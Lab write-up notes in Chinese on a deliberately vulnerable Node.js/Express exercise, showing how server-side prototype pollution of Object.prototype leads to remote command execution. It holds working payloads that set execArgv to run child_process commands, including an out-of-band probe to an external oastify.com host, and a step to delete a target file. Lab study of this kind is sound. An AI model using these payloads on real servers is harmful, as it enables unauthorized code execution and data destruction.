# 实验室：通过服务端原型污染实现远程代码执行

本实验室基于 Node.js 和 Express 框架构建，由于不安全地将用户可控输入合并到服务端 JavaScript 对象中，存在服务端原型污染漏洞。

由于服务器的配置，可以通过污染 `Object.prototype` 来注入任意系统命令，这些命令随后会在服务器上执行。

要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的原型污染源。
2. 识别一个可用于注入并执行任意系统命令的小工具。
3. 触发远程执行一条命令，删除文件 `/home/carlos/morale.txt`。

在本实验中，你已拥有提升的权限，可以访问管理功能。你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 命令执行汇点仅当管理员用户触发网站上的易受攻击功能时才会被调用。

> **注意**
> 在测试服务端原型污染时，可能会破坏应用程序功能甚至导致服务器完全崩溃。如果实验室发生这种情况，你可以使用实验室横幅中提供的按钮手动重启服务器。请记住，在测试真实网站时，你不太可能有此选项，因此务必谨慎操作。

尝试代码执行
- 尝试 JS 代码执行带外探测

    - 尝试 child_process.exec

        ```json
                "--eval=require('child_process').exec('host id.oastify.com')"

        }
        ```
        - 成功

    - 尝试 child_process.execSync
        ```json
        "__proto__": {
            "execArgv":"--eval=require('child_process').execSync('host id.oastify.com')"
        ```

- 发送子进程污染，JS 代码删除文件
